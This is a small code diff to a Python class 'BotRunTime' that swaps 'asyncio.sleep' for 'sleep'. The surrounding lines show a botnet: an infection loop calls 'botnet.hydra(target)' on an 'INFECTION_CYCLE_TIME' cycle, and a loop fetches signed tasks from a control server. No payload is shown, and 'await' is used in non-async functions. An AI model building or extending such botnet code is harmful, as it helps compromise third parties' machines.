@@ -21,13 +21,13 @@ class BotRunTime:
             botnet.hydra(target)
             #print(i.host for i in botnet.botnet)
             j=j+1
-            await asyncio.sleep(settings.INFECTION_CYCLE_TIME)
+            await sleep(settings.INFECTION_CYCLE_TIME)
 
     def get_and_schedule_job(self):
         while True:
             signed_task_description = self.server.get('task')
            # print(signed_task_description)
-            await asyncio.sleep(settings.GET_JOB_CYCLE_TIME)
+            await sleep(settings.GET_JOB_CYCLE_TIME)
 
     def run(self):
         try:
